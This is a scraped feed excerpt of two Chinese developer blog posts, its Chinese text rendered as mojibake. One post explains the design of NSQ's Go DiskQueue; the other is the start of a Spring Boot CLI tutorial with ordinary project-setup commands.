        <span class="hljs-keyword">case</span> d.depthChan &lt;- d.depth:
            <span class="hljs-comment">// return depth</span>

        <span class="hljs-comment">// å…¶ä»–åˆ†æ”¯ï¼šé€€å‡ºã€åŒæ­¥ç­‰...</span>
        }
    }
}
</code></pre>
<h4 data-id="heading-1">âœ¨ è®¾è®¡äº®ç‚¹</h4>
<ul>
<li><strong>æ‰€æœ‰è¯·æ±‚éƒ½é€šè¿‡ channel ä¸²è¡Œè¿›å…¥ ioLoop</strong>
ç”Ÿäº§è€…è°ƒç”¨ <code>Put()</code> â†’ writeChan â†’ ioLoop â†’ writeOne()</li>
<li><strong>ioLoop ä¸éœ€è¦ä»»ä½•äº’æ–¥é”</strong>
å› ä¸ºå†™å…¥æ“ä½œæ°¸è¿œåœ¨å•åç¨‹æ‰§è¡Œï¼Œä¸å­˜åœ¨å¹¶å‘ä¿®æ”¹ã€‚</li>
<li><strong>è¯»é€šé“ readChan ä¹Ÿåœ¨å¾ªç¯å†…å®‰å…¨å‘é€</strong></li>
</ul>
<p>è¿™ä¸ Redis çš„å•çº¿ç¨‹æ¨¡å‹æœ‰å¼‚æ›²åŒå·¥ä¹‹å¦™ï¼š<strong>ä¸²è¡ŒåŒ–æ¢çº¿ç¨‹å®‰å…¨ï¼Œé¿å…é”å¼€é”€</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-2">2. å†…å®¹æ•°æ®æŒ‰ï¼ˆé•¿åº¦+æ•°æ®ï¼‰æ ¼å¼å†™å…¥ç£ç›˜</h2>
<p>NSQ ä¸ºæ¯æ¡è®°å½•å†™å…¥ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-number">4</span>å­—èŠ‚é•¿åº¦ï¼ˆ<span class="hljs-type">int32</span> å¤§ç«¯åºï¼‰ + N å­—èŠ‚æ¶ˆæ¯å†…å®¹
</code></pre>
<h4 data-id="heading-3">å†™å…¥é€»è¾‘åœ¨ <code>writeOne()</code>ï¼š</h4>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// diskqueue.go: writeOne()</span>
dataLen := <span class="hljs-type">int32</span>(<span class="hljs-built_in">len</span>(data))
totalBytes := <span class="hljs-type">int64</span>(<span class="hljs-number">4</span> + dataLen)

<span class="hljs-comment">// å†™é•¿åº¦</span>
binary.Write(&amp;d.writeBuf, binary.BigEndian, dataLen)

<span class="hljs-comment">// å†™å†…å®¹</span>
d.writeBuf.Write(data)

<span class="hljs-comment">// ä¸€æ¬¡æ€§å†™å…¥æ–‡ä»¶</span>
_, err = d.writeFile.Write(d.writeBuf.Bytes())
</code></pre>
<h4 data-id="heading-4">ä¸ºä»€ä¹ˆé‡‡ç”¨â€œé•¿åº¦ + å†…å®¹â€ï¼Ÿ</h4>
<ul>
<li>è¯»å–æ—¶æ— éœ€æ‰«æåˆ†éš”ç¬¦ï¼Œç›´æ¥æŒ‰é•¿åº¦è¯»å– â†’ <strong>é«˜æ€§èƒ½é¡ºåºè¯»</strong></li>
<li>èƒ½å¿«é€Ÿè·³è¿‡æŸåæ•°æ®ï¼ˆé•¿åº¦æ£€æµ‹ï¼‰ â†’ <strong>å¢å¼ºé²æ£’æ€§</strong></li>
<li>äºŒè¿›åˆ¶æ ¼å¼ç´§å‡‘ â†’ <strong>ç£ç›˜å ç”¨å°</strong></li>
</ul>
<h4 data-id="heading-5">æ–‡ä»¶æ»¡äº†ä¼šè‡ªåŠ¨æ»šåŠ¨</h4>
<p>å½“ <code>writePos + totalBytes &gt; maxBytesPerFile</code>ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">if</span> d.writePos &gt; <span class="hljs-number">0</span> &amp;&amp; d.writePos+totalBytes &gt; d.maxBytesPerFile {
    d.writeFileNum++
    d.writePos = <span class="hljs-number">0</span>
    d.sync()
    d.writeFile.Close()
}
</code></pre>
<p>å³ï¼š<strong>å½“å‰æ–‡ä»¶æ»¡ â†’ fsync â†’ å¼€æ–°æ–‡ä»¶ç»§ç»­å†™</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-6">3. å…ƒæ•°æ®æŒä¹…åŒ–ï¼šå‘¨æœŸæ€§è®°å½•è¯»å†™è¿›åº¦</h2>
<p>ä¸ºäº†ä¿è¯<strong>å´©æºƒåä»èƒ½ä»æ­£ç¡®ä½ç½®æ¢å¤</strong>ï¼ŒDiskQueue ä¼šå®šæœŸå°†è¯»å†™æŒ‡é’ˆå’Œ depth å†™å…¥ metadata æ–‡ä»¶ã€‚</p>
<p>å…ƒæ•°æ®å†…å®¹ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs">depth
readFileNum,readPos
writeFileNum,writePos
</code></pre>
<p>å¯¹åº”çš„å†™é€»è¾‘åœ¨ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// diskqueue.go: persistMetaData()</span>
fmt.Fprintf(f, <span class="hljs-string">"%d\n%d,%d\n%d,%d\n"</span>,
    d.depth,
    d.readFileNum, d.readPos,
    d.writeFileNum, d.writePos)
</code></pre>
<p>é‡‡ç”¨å®‰å…¨çš„ <strong>tmp file + rename åŸå­æ›¿æ¢</strong>ï¼Œä¿è¯æ–‡ä»¶å†…éƒ¨çš„æ•°æ®æ˜¯å®Œæ•´ï¼š</p>
<pre><code class="hljs language-go" lang="go">tmpFileName := fmt.Sprintf(<span class="hljs-string">"%s.%d.tmp"</span>, fileName, rand.Int())
os.Rename(tmpFileName, fileName)  <span class="hljs-comment">// åŸå­æäº¤</span>
</code></pre>
<p>è¿™æ ·å³ä½¿åœ¨æŒä¹…åŒ–è¿‡ç¨‹ä¸­å´©æºƒä¹Ÿä¸ä¼šç ´ååŸæœ‰ metadataã€‚</p>
<h4 data-id="heading-7">ä»€ä¹ˆæ—¶å€™ä¼šåŒæ­¥ï¼Ÿ</h4>
<p>ä¸¤ç§æ¨¡å¼ï¼š</p>
<ol>
<li><strong>æ¯å†™ X æ¡æ¶ˆæ¯</strong>ï¼ˆé€šè¿‡ syncEvery é…ç½®ï¼‰</li>
<li><strong>å®šæ—¶ syncTimeout è§¦å‘ fsync</strong></li>
</ol>
<p>è§¦å‘é€»è¾‘åœ¨ ioLoop ä¸­å¤„ç†ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">if</span> d.needSync &amp;&amp; (writes%syncEvery == <span class="hljs-number">0</span> || time.Since(lastSync) &gt; syncTimeout) {
    d.sync()
}
</code></pre>
<hr/>
<h2 data-id="heading-8">4. è¯»å–è®°å½•ï¼ˆä¸€æ¬¡å–ä¸€æ¡ï¼ŒåŒæ ·é‡‡ç”¨â€œé•¿åº¦+æ•°æ®â€æ ¼å¼ï¼‰</h2>
<p>è¯»å–é€»è¾‘åœ¨ <code>readOne()</code>ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">var</span> msgSize <span class="hljs-type">int32</span>
binary.Read(d.reader, binary.BigEndian, &amp;msgSize)

readBuf := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, msgSize)
io.ReadFull(d.reader, readBuf)
</code></pre>
<p>å¹¶è®¡ç®—ä¸‹ä¸€æ¬¡è¯»å–çš„ä½ç½®ï¼š</p>
<pre><code class="hljs language-go" lang="go">totalBytes := <span class="hljs-type">int64</span>(<span class="hljs-number">4</span> + msgSize)
d.nextReadPos = d.readPos + totalBytes
</code></pre>
<h4 data-id="heading-9">æ–‡ä»¶æ»šåŠ¨</h4>
<p>è¯»å–åˆ°æ–‡ä»¶æœ«å°¾æ—¶ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">if</span> d.readFileNum &lt; d.writeFileNum &amp;&amp; d.nextReadPos &gt;= d.maxBytesPerFileRead {
    d.nextReadFileNum++
    d.nextReadPos = <span class="hljs-number">0</span>
}
</code></pre>
<p>DiskQueue ä¼šè‡ªåŠ¨åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªæ–‡ä»¶ã€‚</p>
<hr/>
<h2 data-id="heading-10">æ€»ç»“ï¼šDiskQueue ä»¥æå°çš„ä»£ç å®ç°æç¨³å¥çš„æŒä¹…åŒ–é˜Ÿåˆ—</h2>

























<table><thead><tr><th>è®¾è®¡ç‚¹</th><th>å¸¦æ¥çš„ä»·å€¼</th></tr></thead><tbody><tr><td>ioLoop å•åç¨‹ä¸²è¡Œè°ƒåº¦</td><td>æ— é”ã€çº¿ç¨‹å®‰å…¨ã€é«˜æ€§èƒ½</td></tr><tr><td>é•¿åº¦+æ•°æ® æ ¼å¼</td><td>é¡ºåºè¯»å†™æœ€é«˜æ•ˆã€æ ¼å¼å®‰å…¨</td></tr><tr><td>æ–‡ä»¶æ»šåŠ¨ç­–ç•¥</td><td>æé«˜ç£ç›˜å±€éƒ¨æ€§ï¼Œé¿å…å·¨å‹æ–‡ä»¶</td></tr><tr><td>metadata åŸå­æŒä¹…åŒ–</td><td>å´©æºƒå¯æ¢å¤ï¼Œä¸äº§ç”Ÿéƒ¨åˆ†å†™å…¥</td></tr></tbody></table>
<p>NSQ çš„ DiskQueue æ˜¯å·¥ç¨‹ä¸­<strong>å°è€Œç¾ã€é«˜å¯é ã€é«˜æ€§èƒ½</strong>ç£ç›˜é˜Ÿåˆ—å®ç°çš„å…¸èŒƒï¼Œéå¸¸å€¼å¾—å­¦ä¹ ã€‚</p>
<p>å¦‚æœä½ æ­£åœ¨å®ç°ï¼š</p>
<ul>
<li>æœ¬åœ°æ¶ˆæ¯é˜Ÿåˆ—</li>
<li>ä»»åŠ¡æ‰§è¡Œå™¨çš„æŒä¹…åŒ–å­˜å‚¨</li>
<li>åˆ†å¸ƒå¼ç³»ç»Ÿçš„æŒä¹…åŒ– mailbox</li>
<li>WAL / é¡ºåºå†™æ—¥å¿—</li>
</ul>
<p>DiskQueue éƒ½æ˜¯ä¸€ä¸ªæå¥½çš„å‚è€ƒã€‚</p>
<blockquote>
<p>nsqçš„diskqueueæºç ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnsqio%2Fgo-diskqueue%2Fblob%2Fmaster%2Fdiskqueue.go" target="_blank" title="https://github.com/nsqio/go-diskqueue/blob/master/diskqueue.go" ref="nofollow noopener noreferrer">github.com/nsqio/go-diâ€¦</a></p>
</blockquote>
<blockquote>
<p>æˆ‘çš„å°æ ˆï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fitart.cn%2Fblogs%2F2025%2Fpractice%2Fnsq-diskqueue-persistent-queue-design-analysis.html" target="_blank" title="https://itart.cn/blogs/2025/practice/nsq-diskqueue-persistent-queue-design-analysis.html" ref="nofollow noopener noreferrer">itart.cn/blogs/2025/â€¦</a></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring Boot CLI ä»å…¥é—¨åˆ°ä¼ä¸šçº§å®æˆ˜ï¼ˆä¸Šä¸‹ç¯‡ï¼‰]]></title>    <link>https://juejin.cn/post/7576844295434616841</link>    <guid>https://juejin.cn/post/7576844295434616841</guid>    <pubDate>2025-11-27T00:28:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576844295434616841" data-draft-id="7576863819982323721" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring Boot CLI ä»å…¥é—¨åˆ°ä¼ä¸šçº§å®æˆ˜ï¼ˆä¸Šä¸‹ç¯‡ï¼‰"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-11-27T00:28:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§å¤´an"/> <meta itemprop="url" content="https://juejin.cn/user/618374030438861"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring Boot CLI ä»å…¥é—¨åˆ°ä¼ä¸šçº§å®æˆ˜ï¼ˆä¸Šä¸‹ç¯‡ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/618374030438861/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§å¤´an
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T00:28:57.000Z" title="Thu Nov 27 2025 00:28:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Spring Boot CLI å®Œå…¨æŒ‡å—ï¼ˆä¸Šç¯‡ï¼‰ï¼šä»å…¥é—¨åˆ°ä¼ä¸šçº§å®æˆ˜</h2>
<h3 data-id="heading-1">å‰è¨€</h3>
<p>åœ¨å½“ä»Šå¿«èŠ‚å¥çš„è½¯ä»¶å¼€å‘ä¸–ç•Œä¸­ï¼Œæ•ˆç‡å°±æ˜¯ç«äº‰åŠ›ã€‚Spring Boot CLI ä½œä¸º Spring ç”Ÿæ€ä¸­çš„éšè—ç‘°å®ï¼Œèƒ½å¤Ÿå°†é¡¹ç›®åˆå§‹åŒ–æ—¶é—´ä»å°æ—¶çº§ç¼©çŸ­åˆ°ç§’çº§ï¼Œå°†å¤æ‚é…ç½®ä»æ‰‹åŠ¨æ“ä½œå˜ä¸ºä¸€é”®ç”Ÿæˆã€‚æ— è®ºä½ æ˜¯åˆšåˆšæ¥è§¦ Spring Boot çš„æ–°æ‰‹ï¼Œè¿˜æ˜¯æ­£åœ¨æ„å»ºå¤§å‹å¾®æœåŠ¡æ¶æ„çš„èµ„æ·±æ¶æ„å¸ˆï¼ŒæŒæ¡ Spring Boot CLI éƒ½å°†ä¸ºä½ çš„å¼€å‘å·¥ä½œæµå¸¦æ¥é©å‘½æ€§çš„æå‡ã€‚</p>
<p>æœ¬æŒ‡å—å°†å¸¦ä½ ä» CLI çš„åŸºç¡€å®‰è£…å¼€å§‹ï¼Œé€æ­¥æ·±å…¥åˆ°ä¼ä¸šçº§åº”ç”¨å®æˆ˜ï¼Œæœ€ç»ˆæ¢ç´¢æ¶æ„å¸ˆçº§åˆ«çš„é«˜çº§ç”¨æ³•ã€‚è®©æˆ‘ä»¬å¼€å§‹è¿™æ®µé«˜æ•ˆå¼€å‘ä¹‹æ—…ï¼</p>
<h3 data-id="heading-2">ä¸€ã€Spring Boot CLI åŸºç¡€å…¥é—¨</h3>
<h4 data-id="heading-3">1.1 ä»€ä¹ˆæ˜¯ Spring Boot CLIï¼Ÿ</h4>
<p>Spring Boot CLIï¼ˆå‘½ä»¤è¡Œæ¥å£ï¼‰æ˜¯ä¸€ä¸ªå¼ºå¤§çš„å¼€å‘å·¥å…·ï¼Œå®ƒé€šè¿‡ç®€åŒ–çš„å‘½ä»¤è¡Œæ“ä½œï¼Œè®© Spring åº”ç”¨çš„åˆ›å»ºå’Œç®¡ç†å˜å¾—å‰æ‰€æœªæœ‰çš„ç®€å•ã€‚</p>
<p><strong>æ ¸å¿ƒä»·å€¼çŸ©é˜µï¼š</strong></p>
<ul>
<li>âš¡ <strong>æè‡´æ•ˆç‡</strong> - é¡¹ç›®åˆå§‹åŒ–ä»æƒ³æ³•åˆ°è¿è¡Œåªéœ€30ç§’</li>
<li>ğŸ¯ <strong>ç²¾å‡†æ§åˆ¶</strong> - æ¯ä¸ªä¾èµ–ã€æ¯ä¸ªé…ç½®éƒ½å¯ç²¾ç¡®æ§åˆ¶</li>
<li>ğŸ”„ <strong>ä¸€è‡´æ€§ä¿è¯</strong> - å›¢é˜Ÿé¡¹ç›®ç»“æ„æ ‡å‡†åŒ–</li>
<li>ğŸ”§ <strong>çµæ´»æ‰©å±•</strong> - æ”¯æŒå„ç§å¤æ‚åœºæ™¯éœ€æ±‚</li>
</ul>
<h4 data-id="heading-4">1.2 å®‰è£…ä¸é…ç½®</h4>
<h5 data-id="heading-5">å¤šå¹³å°å®‰è£…æ–¹æ¡ˆ</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ–¹å¼1ï¼šSDKMAN!ï¼ˆæ¨èï¼‰</span>
sdk install springboot
spring --version

<span class="hljs-comment"># æ–¹å¼2ï¼šHomebrewï¼ˆMacç”¨æˆ·ï¼‰</span>
brew tap spring-io/tap
brew install spring-boot

<span class="hljs-comment"># æ–¹å¼3ï¼šæ‰‹åŠ¨å®‰è£…</span>
<span class="hljs-comment"># ä¸‹è½½åœ°å€ï¼šhttps://repo.spring.io/release/org/springframework/boot/spring-boot-cli/</span>
</code></pre>
<h5 data-id="heading-6">éªŒè¯å®‰è£…</h5>
<pre><code class="hljs language-bash" lang="bash">$ spring --version
Spring CLI v3.2.0-SNAPSHOT

$ spring
usage: spring [--<span class="hljs-built_in">help</span>] [--version]
       &lt;<span class="hljs-built_in">command</span>&gt; [&lt;args&gt;]

Available commands are:
  init [options] [location]
    Initialize a new project using Spring Initializr
  encodepassword [options] &lt;password to encode&gt;
    Encode a password <span class="hljs-keyword">for</span> use with Spring Security
  shell
    Start a nested shell
</code></pre>
<h4 data-id="heading-7">1.3 æ ¸å¿ƒå‘½ä»¤è¯¦è§£</h4>
<h5 data-id="heading-8">é¡¹ç›®åˆå§‹åŒ–ï¼ˆinitï¼‰</h5>
<p><strong>åŸºç¡€ç”¨æ³•ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç®€å•Webé¡¹ç›®</span>
spring init --dependencies=web my-web-app

<span class="hljs-comment"># åŒ…å«æ•°æ®è®¿é—®çš„å®Œæ•´é¡¹ç›®</span>
spring init --dependencies=web,data-jpa,security my-complete-app
</code></pre>
<p><strong>æ¢ç´¢å¯ç”¨é€‰é¡¹ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash">$ spring init --list
=======================================
Capabilities of https://start.spring.io
=======================================

Available dependencies:
-----------------------
web - Web: å…¨æ ˆWebå¼€å‘æ”¯æŒ
data-jpa - Data JPA: Spring Data JPA æ”¯æŒ
security - Security: Spring Security å®‰å…¨æ¡†æ¶
...

Available project types:
------------------------
maven-project - Mavené¡¹ç›®ï¼ˆé»˜è®¤ï¼‰
gradle-project - Gradleé¡¹ç›®
</code></pre>
<h5 data-id="heading-9">é¡¹ç›®åˆ›å»ºæµç¨‹</h5>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[å¼€å§‹é¡¹ç›®åˆ›å»º] --&gt; B{é€‰æ‹©æ„å»ºå·¥å…·}
    B --&gt; C[Maven]
    B --&gt; D[Gradle]
    
    C --&gt; E[é…ç½®Mavenå‚æ•°]
    D --&gt; F[é…ç½®Gradleå‚æ•°]
    
    E --&gt; G{é€‰æ‹©ä¾èµ–}
    F --&gt; G
    
    G --&gt; H[Webç›¸å…³]
    G --&gt; I[æ•°æ®è®¿é—®]
    G --&gt; J[å®‰å…¨æ¡†æ¶]
    G --&gt; K[ç›‘æ§ç®¡ç†]
    
    H --&gt; L[thymeleaf, web, websocket]
    I --&gt; M[data-jpa, data-mongodb, redis]
    J --&gt; N[security, oauth2-client]
    K --&gt; O[actuator, devtools]
    
    L --&gt; P[ç”Ÿæˆé¡¹ç›®ç»“æ„]
    M --&gt; P
    N --&gt; P
    O --&gt; P
    
    P --&gt; Q[ä¸‹è½½é¡¹ç›®æ–‡ä»¶]
    Q --&gt; R[é¡¹ç›®åˆ›å»ºå®Œæˆ]
</code></pre>
<h3 data-id="heading-10">äºŒã€è¿›é˜¶åŠŸèƒ½ä¸å®æˆ˜æŠ€å·§</h3>
<h4 data-id="heading-11">2.1 é«˜çº§é¡¹ç›®é…ç½®</h4>
<p><strong>ä¼ä¸šçº§é¡¹ç›®é…ç½®ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash">spring init \
  --build=gradle \
  --java-version=17 \
  --group-id=com.company \
  --artifact-id=enterprise-app \
  --name=<span class="hljs-string">"ä¼ä¸šçº§åº”ç”¨"</span> \
  --description=<span class="hljs-string">"åŸºäºSpring Bootçš„ä¼ä¸šçº§åº”ç”¨æ¡†æ¶"</span> \
  --dependencies=web,data-jpa,security,redis,actuator \
  --packaging=jar \
  --package-name=com.company.enterprise \
  enterprise-project
</code></pre>
<p><strong>å¤šç¯å¢ƒé…ç½®æ¨¡æ¿ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¼€å‘ç¯å¢ƒ</span>
spring init --dependencies=web,data-jpa,devtools,h2 dev-project

<span class="hljs-comment"># ç”Ÿäº§ç¯å¢ƒ  </span>
spring init --dependencies=web,data-jpa,mysql,actuator prod-project

<span class="hljs-comment"># æµ‹è¯•ç¯å¢ƒ</span>
spring init --dependencies=web,data-jpa,testcontainers test-project
</code></pre>
<h4 data-id="heading-12">2.2 åµŒå…¥å¼ Shell ç¯å¢ƒ</h4>
<p>Spring Boot CLI æä¾›å¼ºå¤§çš„äº¤äº’å¼ Shellï¼š</p>
<pre><code class="hljs language-bash" lang="bash">$ spring shell
Spring Boot (v3.2.0-SNAPSHOT)
Hit TAB to complete. Type <span class="hljs-string">'help'</span> and hit RETURN <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>, and <span class="hljs-string">'exit'</span> to quit.

<span class="hljs-comment"># åœ¨Shellä¸­ç›´æ¥æ“ä½œ</span>
$&gt; version
Spring CLI v3.2.0-SNAPSHOT

$&gt; init --dependencies=web demo-app
Using service at https://start.spring.io
Project extracted to <span class="hljs-string">'/path/to/demo-app'</span>

$&gt; !<span class="hljs-built_in">ls</span> -la  <span class="hljs-comment"># æ‰§è¡Œæœ¬åœ°å‘½ä»¤</span>
</code></pre>
<h4 data-id="heading-13">2.3 æ‰¹é‡é¡¹ç›®ç”Ÿæˆ</h4>
<p><strong>å¾®æœåŠ¡æ‰¹é‡åˆ›å»ºè„šæœ¬ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># create-microservices.sh</span>

services=(<span class="hljs-string">"user"</span> <span class="hljs-string">"order"</span> <span class="hljs-string">"product"</span> <span class="hljs-string">"inventory"</span> <span class="hljs-string">"notification"</span>)

<span class="hljs-keyword">for</span> service <span class="hljs-keyword">in</span> <span class="hljs-string">"<span class="hljs-variable">${services[@]}</span>"</span>; <span class="hljs-keyword">do</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"åˆ›å»ºæœåŠ¡: <span class="hljs-variable">$service</span>-service"</span>
    spring init \
        --dependencies=web,data-jpa,config-client \
        --group-id=com.company \
        --artifact-id=<span class="hljs-string">"<span class="hljs-variable">$service</span>-service"</span> \
        --name=<span class="hljs-string">"<span class="hljs-variable">$service</span>-service"</span> \
        <span class="hljs-string">"<span class="hljs-variable">$service</span>-service"</span> &amp;
<span class="hljs-keyword">done</span>

<span class="hljs-built_in">wait</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"æ‰€æœ‰æœåŠ¡åˆ›å»ºå®Œæˆï¼"</span>
</code></pre>
<h3 data-id="heading-14">ä¸‰ã€ä¼ä¸šçº§å®æˆ˜åº”ç”¨</h3>
<h4 data-id="heading-15">3.1 å¾®æœåŠ¡ç”Ÿæ€ç³»ç»Ÿæ­å»º</h4>
<p><strong>å®Œæ•´å¾®æœåŠ¡å¥—ä»¶ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># microservice-ecosystem.sh</span>

<span class="hljs-comment"># åŸºç¡€è®¾æ–½æœåŠ¡</span>
INFRA_SERVICES=(
    <span class="hljs-string">"service-registry:eureka-server"</span>
    <span class="hljs-string">"config-server:config-server"</span> 
    <span class="hljs-string">"api-gateway:cloud-gateway,web"</span>
)

<span class="hljs-comment"># ä¸šåŠ¡å¾®æœåŠ¡</span>
BUSINESS_SERVICES=(
